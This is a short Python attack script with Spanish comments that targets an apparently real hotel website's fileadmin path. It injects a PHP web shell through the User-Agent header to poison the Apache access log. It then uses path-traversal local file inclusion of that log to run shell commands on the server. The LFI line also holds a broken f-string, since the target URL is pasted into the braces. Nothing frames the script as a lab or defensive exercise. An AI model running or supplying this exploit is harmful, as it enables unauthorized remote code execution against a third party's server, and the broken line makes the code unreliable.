import requests
import sys

if len(sys.argv) < 2:
    print(f"Uso: python {sys.argv[0]} https://www.bernerhotel.com/fileadmin")
    sys.exit(1)

target_url = sys.argv[1]

# 1. Envenenar el log del servidor (Log Poisoning)
# Se inyecta código PHP en el User-Agent para que quede registrado en el log
payload_code = "<?php echo system($_GET['cmd']); ?>"
headers = {'User-Agent': payload_code}

print(f"[*] Envenenando el log del servidor: {target_url}")
try:
    r = requests.get(target_url, headers=headers)
    print(f"[+] Estado de la petición: {r.status_code}")
except requests.exceptions.RequestException as e:
    print(f"[-] Error al conectar con el servidor: {e}")
    sys.exit(1)

# 2. Incluir el log envenenado (LFI) para ejecutar el código
log_path = "../../../../var/log/apache2/access.log"  # Ruta común, puede variar
lfi_url = f"{https://www.bernerhotel.com/fileadmin}?file={log_path}&cmd=id"
print(f"[*] Inyectando y ejecutando comando a través de LFI: {lfi_url}")

try:
    r = requests.get(lfi_url)
    print("[+] Respuesta del servidor:")
    print(r.text[:500])  # Muestra primeros 500 caracteres de la respuesta
except requests.exceptions.RequestException as e:
    print(f"[-] Error al ejecutar LFI: {e}")